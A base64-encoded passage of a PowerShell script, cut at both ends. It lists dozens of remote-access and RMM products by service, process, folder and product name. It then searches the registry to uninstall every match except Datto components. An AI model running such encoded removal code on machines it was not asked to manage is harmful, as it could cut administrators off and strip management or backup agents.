aWV3ZXIqJywndHZfdzMyKicsJ3R2X3g2NConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xU
ZWFtVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFRlYW1WaWV3ZXIiKTsgUHJvZD1A
KCdUZWFtVmlld2VyKicpIH0KICAgICAgICBAeyBUYWc9J1NwbGFzaHRvcCc7ICAgIFN2Yz1AKCdT
cGxhc2h0b3AqJywnU1JTZXJ2aWNlJywnU1NVU2VydmljZScpOyBQcm9jPUAoJ1NwbGFzaHRvcCon
LCdzdHJ3aW5jbHQqJywnU1JNYW5hZ2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFNw
bGFzaHRvcCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTcGxhc2h0b3AiKTsgUHJvZD1AKCdT
cGxhc2h0b3AqJykgfQogICAgICAgIEB7IFRhZz0nTG9nTWVJbic7ICAgICAgU3ZjPUAoJ0xvZ01l
SW4nLCdMTUlHdWFyZGlhblN2YycsJ0xNSWlnbml0aW9uJyk7IFByb2M9QCgnTG9nTWVJbionLCdM
TUlHdWFyZGlhbionLCdSYVNlcnZlcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMb2dN
ZUluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XExvZ01lSW4iKTsgUHJvZD1AKCdMb2dNZUlu
KicpIH0KICAgICAgICBAeyBUYWc9J0dvVG8nOyAgICAgICAgIFN2Yz1AKCdHb1RvTXlQQyonLCdH
b1RvQXNzaXN0KicsJ0dvVG9SZXNvbHZlKicpOyBQcm9jPUAoJ0dvVG9NeVBDKicsJ0dvVG9Bc3Np
c3QqJywnZzJtKicsJ0dvVG9SZXNvbHZlKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdv
VG9NeVBDIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEdvVG9NeVBDIik7IFByb2Q9QCgnR29U
b015UEMqJywnR29Ub0Fzc2lzdConLCdHb1RvIFJlc29sdmUqJywnR29Ub01lZXRpbmcqJywnR29U
byBDb25uZWN0KicpIH0KICAgICAgICBAeyBUYWc9J1J1c3REZXNrJzsgICAgIFN2Yz1AKCdSdXN0
RGVzaycsJ3J1c3RkZXNrKicpOyBQcm9jPUAoJ3J1c3RkZXNrKicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXFJ1c3REZXNrIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFJ1c3REZXNrIik7
IFByb2Q9QCgnUnVzdERlc2sqJykgfQogICAgICAgIEB7IFRhZz0nU3VwcmVtbyc7ICAgICAgU3Zj
PUAoJ1N1cHJlbW8qJyk7IFByb2M9QCgnU3VwcmVtbyonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xTdXByZW1vIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFN1cHJlbW8iKTsgUHJvZD1A
KCdTdXByZW1vKicpIH0KICAgICAgICBAeyBUYWc9J0RXU2VydmljZSc7ICAgIFN2Yz1AKCdEV0Fn
ZW50JywnZHdhZ2VudConKTsgUHJvYz1AKCdkd2FnZW50KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3Jh
bUZpbGVzXERXQWdlbnQiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cRFdBZ2VudCIsIiRlbnY6
UHJvZ3JhbURhdGFcRFdBZ2VudCIpOyBQcm9kPUAoJ0RXQWdlbnQqJywnRFdTZXJ2aWNlKicpIH0K
ICAgICAgICBAeyBUYWc9J1pvaG9Bc3Npc3QnOyAgIFN2Yz1AKCdab2hvQXNzaXN0KicsJ1pvaG9N
ZWV0aW5nKicpOyBQcm9jPUAoJ1pvaG9Bc3Npc3QqJywnWm9ob1VSU0IqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcWm9ob01lZXRpbmciLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cWm9o
b01lZXRpbmciKTsgUHJvZD1AKCdab2hvIEFzc2lzdConLCdab2hvTWVldGluZyonKSB9CiAgICAg
ICAgQHsgVGFnPSdSZW1vdGVQQyc7ICAgICBTdmM9QCgnUmVtb3RlUEMqJyk7IFByb2M9QCgnUmVt
b3RlUEMqJywnUlBDU3VpdGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcUmVtb3RlUEMi
LCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVtb3RlUEMiKTsgUHJvZD1AKCdSZW1vdGVQQyon
KSB9CiAgICAgICAgQHsgVGFnPSdCb21nYXInOyAgICAgICBTdmM9QCgnYm9tZ2FyKicsJ0JleW9u
ZFRydXN0KicpOyBQcm9jPUAoJ2JvbWdhcionKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xC
b21nYXIiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQm9tZ2FyIiwiJGVudjpQcm9ncmFtRmls
ZXNcQmV5b25kVHJ1c3QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQmV5b25kVHJ1c3QiKTsg
UHJvZD1AKCdCb21nYXIqJywnQmV5b25kVHJ1c3QqJykgfQogICAgICAgIEB7IFRhZz0nUGFyc2Vj
JzsgICAgICAgU3ZjPUAoJ1BhcnNlYyonKTsgUHJvYz1AKCdwYXJzZWNkKicsJ3BzZXJ2aWNlKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFBhcnNlYyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxQYXJzZWMiLCIkZW52OlByb2dyYW1EYXRhXFBhcnNlYyIpOyBQcm9kPUAoJ1BhcnNlYyon
KSB9CiAgICAgICAgQHsgVGFnPSdDaHJvbWVSRCc7ICAgICBTdmM9QCgnY2hyb21vdGluZyonKTsg
UHJvYz1AKCdyZW1vdGluZ19ob3N0KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEdvb2ds
ZVxDaHJvbWUgUmVtb3RlIERlc2t0b3AiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cR29vZ2xl
XENocm9tZSBSZW1vdGUgRGVza3RvcCIpOyBQcm9kPUAoJ0Nocm9tZSBSZW1vdGUgRGVza3RvcCon
KSB9CiAgICAgICAgQHsgVGFnPSdVbHRyYVZOQyc7ICAgICBTdmM9QCgndXZuYyonLCd3aW52bmMq
Jyk7IFByb2M9QCgnd2ludm5jKicsJ3V2bmMqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
VWx0cmFWTkMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cVWx0cmFWTkMiKTsgUHJvZD1AKCdV
bHRyYVZOQyonLCdXaW5WTkMqJykgfQogICAgICAgIEB7IFRhZz0nVGlnaHRWTkMnOyAgICAgU3Zj
PUAoJ3R2bnNlcnZlcionKTsgUHJvYz1AKCd0dm5zZXJ2ZXIqJywndHZudmlld2VyKicpOyBEaXJz
PUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFRpZ2h0Vk5DIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XFRpZ2h0Vk5DIik7IFByb2Q9QCgnVGlnaHRWTkMqJykgfQogICAgICAgIEB7IFRhZz0nUmVhbFZO
Qyc7ICAgICAgU3ZjPUAoJ3ZuY3NlcnZlcionKTsgUHJvYz1AKCd2bmNzZXJ2ZXIqJywndm5jdmll
d2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJlYWxWTkMiLCIke2VudjpQcm9ncmFt
RmlsZXMoeDg2KX1cUmVhbFZOQyIpOyBQcm9kPUAoJ1ZOQyBTZXJ2ZXIqJywnUmVhbFZOQyonKSB9
CiAgICAgICAgQHsgVGFnPSdEYW1lV2FyZSc7ICAgICBTdmM9QCgnRGFtZVdhcmUqJyk7IFByb2M9
QCgnRFdSQ1MqJywnRFdSQ0MqJywnRGFtZVdhcmUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmls
ZXNcU29sYXJXaW5kcyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxTb2xhcldpbmRzIiwiJGVu
djpQcm9ncmFtRmlsZXNcRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cRGFtZVdhcmUgUmVtb3RlIFN1cHBvcnQiKTsgUHJvZD1AKCdEYW1lV2FyZSonKSB9
CiAgICAgICAgQHsgVGFnPSdOZXRTdXBwb3J0JzsgICBTdmM9QCgnTmV0U3VwcG9ydConKTsgUHJv
Yz1AKCdjbGllbnQzMionLCdwY2ljdGwqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcTmV0
U3VwcG9ydCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOZXRTdXBwb3J0Iik7IFByb2Q9QCgn
TmV0U3VwcG9ydConKSB9CiAgICAgICAgQHsgVGFnPSdTaW1wbGVIZWxwJzsgICBTdmM9QCgnU2lt
cGxlSGVscConKTsgUHJvYz1AKCdTaW1wbGVTZXJ2aWNlKicsJ3NpbXBsZXNlcnZpY2UqJyk7IERp
cnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcU2ltcGxlSGVscCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxTaW1wbGVIZWxwIik7IFByb2Q9QCgnU2ltcGxlSGVscConKSB9CiAgICAgICAgQHsgVGFn
PSdHZXRTY3JlZW4nOyAgICBTdmM9QCgnR2V0U2NyZWVuKicpOyBQcm9jPUAoJ0dldFNjcmVlbion
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHZXRTY3JlZW4iLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cR2V0U2NyZWVuIik7IFByb2Q9QCgnR2V0U2NyZWVuKicpIH0KICAgICAgICBAeyBU
YWc9J0lwZXJpdXMnOyAgICAgIFN2Yz1AKCdJcGVyaXVzKicpOyBQcm9jPUAoJ0lwZXJpdXNSZW1v
dGUqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSXBlcml1cyBSZW1vdGUiLCIke2VudjpQ
cm9ncmFtRmlsZXMoeDg2KX1cSXBlcml1cyBSZW1vdGUiKTsgUHJvZD1AKCdJcGVyaXVzKicpIH0K
ICAgICAgICBAeyBUYWc9J0lTTE9ubGluZSc7ICAgU3ZjPUAoJ0lTTGxpZ2h0KicpOyBQcm9jPUAo
J0lTTGxpZ2h0KicsJ0lTTEFsd2F5c09uKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXElT
TCBPbmxpbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cSVNMIE9ubGluZSIpOyBQcm9kPUAo
J0lTTCBMaWdodConLCdJU0wgQWx3YXlzT24qJykgfQogICAgICAgIEB7IFRhZz0nQW1teXknOyAg
ICAgICAgU3ZjPUAoJ0FtbXl5KicpOyBQcm9jPUAoJ0FtbXl5KicpOyBEaXJzPUAoIiRlbnY6UHJv
Z3JhbUZpbGVzXEFtbXl5IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFtbXl5Iik7IFByb2Q9
QCgnQW1teXkqJykgfQogICAgICAgIEB7IFRhZz0nVWx0cmFWaWV3ZXInOyAgU3ZjPUAoJ1VsdHJh
Vmlld2VyKicpOyBQcm9jPUAoJ1VsdHJhVmlld2VyKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZp
bGVzXFVsdHJhVmlld2VyIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFVsdHJhVmlld2VyIik7
IFByb2Q9QCgnVWx0cmFWaWV3ZXIqJykgfQogICAgICAgIEB7IFRhZz0nQWVyb0FkbWluJzsgICAg
U3ZjPUAoJ0Flcm9BZG1pbionKTsgUHJvYz1AKCdBZXJvQWRtaW4qJyk7IERpcnM9QCgiJGVudjpQ
cm9ncmFtRmlsZXNcQWVyb0FkbWluIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XEFlcm9BZG1p
biIpOyBQcm9kPUAoJ0Flcm9BZG1pbionKSB9CiAgICAgICAgQHsgVGFnPSdMaXRlTWFuYWdlcic7
ICBTdmM9QCgnTGl0ZU1hbmFnZXIqJyk7IFByb2M9QCgnUk9NU2VydmVyKicsJ1JPTVZpZXdlcion
KTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMaXRlTWFuYWdlciIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxMaXRlTWFuYWdlciIpOyBQcm9kPUAoJ0xpdGVNYW5hZ2VyKicpIH0KICAgICAg
ICBAeyBUYWc9J1JhZG1pbic7ICAgICAgIFN2Yz1AKCdSYWRtaW4qJyk7IFByb2M9QCgncnNlcnZl
cjMqJywnUmFkbWluKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFJhZG1pbiBTZXJ2ZXIg
MyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxSYWRtaW4gU2VydmVyIDMiKTsgUHJvZD1AKCdS
YWRtaW4qJykgfQogICAgICAgIEB7IFRhZz0nTm9NYWNoaW5lJzsgICAgU3ZjPUAoJ254c2VydmVy
KicsJ254ZConKTsgUHJvYz1AKCdueGQqJywnbnhzZXJ2ZXIqJywnbnhydW5uZXIqJyk7IERpcnM9
QCgiJGVudjpQcm9ncmFtRmlsZXNcTm9NYWNoaW5lIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XE5vTWFjaGluZSIpOyBQcm9kPUAoJ05vTWFjaGluZSonKSB9CiAgICAgICAgQHsgVGFnPSdOaW5q
YU9uZSc7ICAgICBTdmM9QCgnTmluamFSTU1BZ2VudCcsJ25pbmphcm1tKicsJ05pbmphUk1NKicp
OyBQcm9jPUAoJ05pbmphUk1NQWdlbnQqJywnbmluamFybW0qJyk7IERpcnM9QCgiJGVudjpQcm9n
cmFtRmlsZXNcTmluamFSTU1BZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOaW5qYVJN
TUFnZW50IiwiJGVudjpQcm9ncmFtRGF0YVxOaW5qYVJNTUFnZW50IiwiJGVudjpQcm9ncmFtRmls
ZXNcTmluamFPbmUiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTmluamFPbmUiKTsgUHJvZD1A
KCdOaW5qYVJNTSonLCdOaW5qYU9uZSonKSB9CiAgICAgICAgQHsgVGFnPSdBdGVyYSc7ICAgICAg
ICBTdmM9QCgnQXRlcmFBZ2VudCcpOyBQcm9jPUAoJ0F0ZXJhQWdlbnQqJyk7IERpcnM9QCgiJGVu
djpQcm9ncmFtRmlsZXNcQVRFUkEgTmV0d29ya3MiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1c
QVRFUkEgTmV0d29ya3MiLCIkZW52OlByb2dyYW1EYXRhXEFURVJBIE5ldHdvcmtzIik7IFByb2Q9
QCgnQXRlcmEqJykgfQogICAgICAgIEB7IFRhZz0nQ29ubmVjdFdpc2UnOyAgU3ZjPUAoJ0xUU2Vy
dmljZScsJ0xUU3ZjTW9uJyk7IFByb2M9QCgnTFRTdmMqJywnTFRUcmF5KicpOyBEaXJzPUAoIiRl
bnY6d2luZGlyXExUU3ZjIiwiJGVudjpQcm9ncmFtRmlsZXNcTGFiVGVjaCBDbGllbnQiLCIke2Vu
djpQcm9ncmFtRmlsZXMoeDg2KX1cTGFiVGVjaCBDbGllbnQiKTsgUHJvZD1AKCdDb25uZWN0V2lz
ZSBBdXRvbWF0ZSonLCdDb25uZWN0V2lzZSBSTU0qJywnTGFiVGVjaConKSB9CiAgICAgICAgQHsg
VGFnPSdLYXNleWEnOyAgICAgICBTdmM9QCgnQWdlbnRNb24nLCdLYXNleWEqJywnS0FBRFMqJyk7
IFByb2M9QCgnQWdlbnRNb24qJywnS2FzZXlhKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVz
XEthc2V5YSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxLYXNleWEiKTsgUHJvZD1AKCdLYXNl
eWEgVlNBKicsJ0thc2V5YSBBZ2VudConKSB9CiAgICAgICAgQHsgVGFnPSdOYWJsZSc7ICAgICAg
ICBTdmM9QCgnQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudConLCdOLWFibGUqJywnTkNlbnRyYWwq
Jyk7IFByb2M9QCgnRmlsZVN5c3RlbUFnZW50KicsJ05DZW50cmFsKicpOyBEaXJzPUAoIiRlbnY6
UHJvZ3JhbUZpbGVzXEFkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cQWR2YW5jZWQgTW9uaXRvcmluZyBBZ2VudCIsIiRlbnY6UHJvZ3JhbUZpbGVzXE4t
YWJsZSBUZWNobm9sb2dpZXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cTi1hYmxlIFRlY2hu
b2xvZ2llcyIsIiRlbnY6UHJvZ3JhbUZpbGVzXE1TUEEgRmlsZXMiLCIke2VudjpQcm9ncmFtRmls
ZXMoeDg2KX1cTVNQQSBGaWxlcyIpOyBQcm9kPUAoJ0FkdmFuY2VkIE1vbml0b3JpbmcgQWdlbnQq
JywnTi1hYmxlKicsJ04tY2VudHJhbConLCdOLXNpZ2h0KicsJ1Rha2UgQ29udHJvbConLCdTb2xh
cldpbmRzIE1TUConKSB9CiAgICAgICAgQHsgVGFnPSdTeW5jcm8nOyAgICAgICBTdmM9QCgnU3lu
Y3JvKicsJ0thYnV0byonKTsgUHJvYz1AKCdTeW5jcm8qJywnS2FidXRvKicpOyBEaXJzPUAoIiRl
bnY6UHJvZ3JhbUZpbGVzXFJlcGFpclRlY2giLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUmVw
YWlyVGVjaCIsIiRlbnY6UHJvZ3JhbUZpbGVzXFN5bmNybyIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxTeW5jcm8iLCIkZW52OlByb2dyYW1EYXRhXFN5bmNybyIpOyBQcm9kPUAoJ1N5bmNybyon
LCdLYWJ1dG8qJywnUmVwYWlyVGVjaConKSB9CiAgICAgICAgQHsgVGFnPSdQdWxzZXdheSc7ICAg
ICBTdmM9QCgnUHVsc2V3YXkqJywnUEMgTW9uaXRvcionKTsgUHJvYz1AKCdQQ01vbml0b3JNZ3Iq
JywnUENNb25pdG9yTWFuYWdlcionLCdQdWxzZXdheSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1G
aWxlc1xQdWxzZXdheSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxQdWxzZXdheSIsIiRlbnY6
UHJvZ3JhbUZpbGVzXFBDIE1vbml0b3IiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cUEMgTW9u
aXRvciIpOyBQcm9kPUAoJ1B1bHNld2F5KicsJ1BDIE1vbml0b3IqJykgfQogICAgICAgIEB7IFRh
Zz0nU3VwZXJPcHMnOyAgICAgU3ZjPUAoJ1N1cGVyT3BzKicpOyBQcm9jPUAoJ1N1cGVyT3BzKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXFN1cGVyT3BzIiwiJHtlbnY6UHJvZ3JhbUZpbGVz
KHg4Nil9XFN1cGVyT3BzIiwiJGVudjpQcm9ncmFtRGF0YVxTdXBlck9wcyIpOyBQcm9kPUAoJ1N1
cGVyT3BzKicpIH0KICAgICAgICBAeyBUYWc9J0xldmVsJzsgICAgICAgIFN2Yz1AKCdMZXZlbCon
KTsgUHJvYz1AKCdsZXZlbConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xMZXZlbCIsIiR7
ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZlbCIsIiRlbnY6UHJvZ3JhbURhdGFcTGV2ZWwiKTsg
UHJvZD1AKCdMZXZlbConKSB9CiAgICAgICAgQHsgVGFnPSdBY3Rpb24xJzsgICAgICBTdmM9QCgn
QWN0aW9uMSonKTsgUHJvYz1AKCdBY3Rpb24xKicsJ2FjdGlvbjFfYWdlbnQqJyk7IERpcnM9QCgi
JGVudjpQcm9ncmFtRmlsZXNcQWN0aW9uMSIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBY3Rp
b24xIiwiJGVudjpQcm9ncmFtRGF0YVxBY3Rpb24xIik7IFByb2Q9QCgnQWN0aW9uMSonKSB9CiAg
ICAgICAgQHsgVGFnPSdNYW5hZ2VFbmdpbmUnOyBTdmM9QCgnTWFuYWdlRW5naW5lKicsJ1VFTVMq
JywnRENBZ2VudConKTsgUHJvYz1AKCdNYW5hZ2VFbmdpbmUqJywnZGNhZ2VudConLCdVRU1TKicp
OyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXE1hbmFnZUVuZ2luZSIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxNYW5hZ2VFbmdpbmUiKTsgUHJvZD1AKCdNYW5hZ2VFbmdpbmUqJywnVUVNUyon
LCdEZXNrdG9wIENlbnRyYWwqJywnRW5kcG9pbnQgQ2VudHJhbConLCdSTU0gQ2VudHJhbConKSB9
CiAgICAgICAgQHsgVGFnPSdUYWN0aWNhbFJNTSc7ICBTdmM9QCgndGFjdGljYWxybW0qJywnTWVz
aCBBZ2VudCcsJ01lc2hBZ2VudCcpOyBQcm9jPUAoJ3RhY3RpY2Fscm1tKicsJ21lc2hhZ2VudCon
LCdNZXNoQWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcVGFjdGljYWxBZ2VudCIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxUYWN0aWNhbEFnZW50IiwiJGVudjpQcm9ncmFtRmls
ZXNcTWVzaCBBZ2VudCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxNZXNoIEFnZW50Iik7IFBy
b2Q9QCgnVGFjdGljYWwqJywnTWVzaCBBZ2VudConLCdNZXNoQ2VudHJhbConKSB9CiAgICAgICAg
QHsgVGFnPSdNZXNoQ2VudHJhbCc7ICBTdmM9QCgnTWVzaCBBZ2VudCcsJ01lc2hBZ2VudCcsJ01l
c2hDZW50cmFsKicpOyBQcm9jPUAoJ01lc2hBZ2VudConLCdNZXNoQ2VudHJhbConKTsgRGlycz1A
KCIkZW52OlByb2dyYW1GaWxlc1xNZXNoIEFnZW50IiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9
XE1lc2ggQWdlbnQiKTsgUHJvZD1AKCdNZXNoKkFnZW50KicsJ01lc2hDZW50cmFsKicpIH0KICAg
ICAgICBAeyBUYWc9J0NvbnRpbnV1bSc7ICAgIFN2Yz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsg
UHJvYz1AKCdTQUFaKicsJ0NvbnRpbnV1bSonKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xT
QUFaT0QiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cU0FBWk9EIiwiJGVudjpQcm9ncmFtRmls
ZXNcQ29udGludXVtIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XENvbnRpbnV1bSIpOyBQcm9k
PUAoJ0NvbnRpbnV1bSonLCdTQUFaKicpIH0KICAgICAgICBAeyBUYWc9J05hdmVyaXNrJzsgICAg
IFN2Yz1AKCdOYXZlcmlzayonKTsgUHJvYz1AKCdOYXZlcmlzayonKTsgRGlycz1AKCIkZW52OlBy
b2dyYW1GaWxlc1xOYXZlcmlzayIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxOYXZlcmlzayIp
OyBQcm9kPUAoJ05hdmVyaXNrKicpIH0KICAgICAgICBAeyBUYWc9J0ltbXlCb3QnOyAgICAgIFN2
Yz1AKCdJbW15Qm90KicsJ0ltbXkqJyk7IFByb2M9QCgnSW1teUFnZW50KicsJ0ltbXlCb3QqJyk7
IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcSW1teUJvdCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4
ODYpfVxJbW15Qm90IiwiJGVudjpQcm9ncmFtRGF0YVxJbW15Qm90Iik7IFByb2Q9QCgnSW1teUJv
dConKSB9CiAgICAgICAgQHsgVGFnPSdBdXRvbW94JzsgICAgICBTdmM9QCgnYW1hZ2VudConLCdB
dXRvbW94KicpOyBQcm9jPUAoJ2FtYWdlbnQqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNc
QXV0b21veCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBdXRvbW94IiwiJGVudjpQcm9ncmFt
RGF0YVxhbWFnZW50Iik7IFByb2Q9QCgnQXV0b21veConKSB9CiAgICAgICAgQHsgVGFnPSdBY3Jv
bmlzQ3liZXInOyBTdmM9QCgnQWNyb25pcyonKTsgUHJvYz1AKCdhY3JvY21kKicpOyBEaXJzPUAo
IiRlbnY6UHJvZ3JhbUZpbGVzXEFjcm9uaXMiLCIke2VudjpQcm9ncmFtRmlsZXMoeDg2KX1cQWNy
b25pcyIpOyBQcm9kPUAoJ0Fjcm9uaXMgQ3liZXIqJywnQWNyb25pcyBBZ2VudConLCdDeWJlciBQ
cm90ZWN0IEFnZW50KicpIH0KICAgICAgICBAeyBUYWc9J0RvbW90eic7ICAgICAgIFN2Yz1AKCdE
b21vdHoqJyk7IFByb2M9QCgnRG9tb3R6KicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXERv
bW90eiIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxEb21vdHoiKTsgUHJvZD1AKCdEb21vdHoq
JykgfQogICAgICAgIEB7IFRhZz0nQXV2aWsnOyAgICAgICAgU3ZjPUAoJ0F1dmlrKicpOyBQcm9j
PUAoJ0F1dmlrKicpOyBEaXJzPUAoIiRlbnY6UHJvZ3JhbUZpbGVzXEF1dmlrIiwiJHtlbnY6UHJv
Z3JhbUZpbGVzKHg4Nil9XEF1dmlrIik7IFByb2Q9QCgnQXV2aWsqJykgfQogICAgICAgIEB7IFRh
Zz0nQmFycmFjdWRhUk1NJzsgU3ZjPUAoJ0JhcnJhY3VkYSonKTsgUHJvYz1AKCdNV1NlcnZpY2Uq
Jyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQmFycmFjdWRhIiwiJHtlbnY6UHJvZ3JhbUZp
bGVzKHg4Nil9XEJhcnJhY3VkYSIsIiRlbnY6UHJvZ3JhbUZpbGVzXExldmVsIFBsYXRmb3JtcyIs
IiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxMZXZlbCBQbGF0Zm9ybXMiKTsgUHJvZD1AKCdCYXJy
YWN1ZGEgUk1NKicsJ01hbmFnZWQgV29ya3BsYWNlKicpIH0KICAgICAgICBAeyBUYWc9J0dvdmVy
bGFuJzsgICAgIFN2Yz1AKCdHb3ZlcmxhbionKTsgUHJvYz1AKCdnb3ZlcmxhbionLCdnb3ZhZ2Vu
dConKTsgRGlycz1AKCIkZW52OlByb2dyYW1GaWxlc1xHb3ZlcmxhbiIsIiR7ZW52OlByb2dyYW1G
aWxlcyh4ODYpfVxHb3ZlcmxhbiIpOyBQcm9kPUAoJ0dvdmVybGFuKicpIH0KICAgICAgICBAeyBU
YWc9J1BEUSc7ICAgICAgICAgIFN2Yz1AKCdQRFEqJyk7IFByb2M9QCgnUERRUnVubmVyKicsJ1BE
UUludmVudG9yeSonLCdQRFFEZXBsb3kqJyk7IERpcnM9QCgiJGVudjpQcm9ncmFtRmlsZXNcQWRt
aW4gQXJzZW5hbCIsIiR7ZW52OlByb2dyYW1GaWxlcyh4ODYpfVxBZG1pbiBBcnNlbmFsIiwiJGVu
djpQcm9ncmFtRmlsZXNcUERRIiwiJHtlbnY6UHJvZ3JhbUZpbGVzKHg4Nil9XFBEUSIpOyBQcm9k
PUAoJ1BEUSBEZXBsb3kqJywnUERRIEludmVudG9yeSonLCdQRFEgQ29ubmVjdConKSB9CiAgICAp
CgogICAgZm9yZWFjaCAoJHRvb2wgaW4gJHJtbSkgewogICAgICAgICRoaXQgPSAkZmFsc2UKICAg
ICAgICBmb3JlYWNoICgkcGF0IGluICR0b29sLlByb2QpIHsKICAgICAgICAgICAgZm9yZWFjaCAo
JHJvb3QgaW4gJHNjcmlwdDpVbmluc3RhbGxSb290cykgewogICAgICAgICAgICAgICAgR2V0LUNo
aWxkSXRlbSAkcm9vdCAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZSB8IEZvckVhY2gtT2Jq
ZWN0IHsKICAgICAgICAgICAgICAgICAgICAkZG4gPSAoR2V0LUl0ZW1Qcm9wZXJ0eSAkXy5QU1Bh
dGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUpLkRpc3BsYXlOYW1lCiAgICAgICAgICAg
ICAgICAgICAgaWYgKCRkbiAtYW5kICRkbiAtbGlrZSAkcGF0KSB7CiAgICAgICAgICAgICAgICAg
ICAgICAgIGlmIChJcy1EYXR0b0tlZXBlciAkZG4pIHsgTG9nICJybW1fc2tpcF9kYXR0b19rZWVw
IFskZG5dIjsgcmV0dXJuIH0KICAgICAgICAgICAgICAgICAgICAgICAgaWYgKFVuaW5zdGFsbC1Q
